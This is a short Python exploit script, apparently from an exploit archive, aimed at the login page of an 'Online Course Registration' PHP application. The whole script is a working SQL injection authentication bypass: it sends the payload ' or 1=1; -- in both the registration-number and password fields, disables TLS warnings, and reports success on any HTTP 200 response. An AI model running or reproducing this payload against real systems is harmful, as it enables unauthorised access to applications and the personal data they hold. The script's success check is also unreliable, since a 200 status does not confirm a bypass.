# Exploit Title:
# Exploit Author: Bobby Cooke
# Date: 
# Vendor Homepage: 
# Software Link: 
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    #SERVER_URL = sys.argv[1]
    SERVER_URL = 'http://172.16.65.130/Online Course Registration/'
    LOGIN_URL  = SERVER_URL + 'index.php'
    s = requests.Session()
    fdata = {'regno' : '%27+or+1%3D1%3B+--+boku', 'password' : '%27+or+1%3D1%3B+--+boku', 'submit' : ''}
    #s.get(SERVER_URL, verify=False)
    r1 = s.post(url=LOGIN_URL, data=fdata, verify=False)
    if r1.status_code == 200:
        print('Success!')
    elif r1.status_code == 404:
        print('Not Found.')

